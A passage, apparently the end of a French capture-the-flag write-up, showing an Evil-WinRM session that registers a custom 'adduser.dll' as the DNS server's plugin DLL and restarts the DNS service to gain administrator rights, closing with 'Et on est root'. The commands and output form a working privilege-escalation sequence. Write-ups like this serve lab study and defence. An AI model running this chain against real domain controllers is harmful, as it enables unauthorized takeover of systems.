/serverlevelplugindll C:\\Users\\ryan\\Documents\\adduser.dll\n\nRegistry property serverlevelplugindll successfully reset.\nCommand completed successfully.\n\n*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt; cmd.exe /c 'sc stop dns'\n\nSERVICE_NAME: dns\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 3  STOP_PENDING\n                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x0\n*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt; cmd.exe /c 'sc start dns'\n\nSERVICE_NAME: dns\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 2  START_PENDING\n                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x7d0\n        PID                : 1496\n        FLAGS              :\n*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt;\n</code></pre> <p>Et on est root :) !</p>"}]}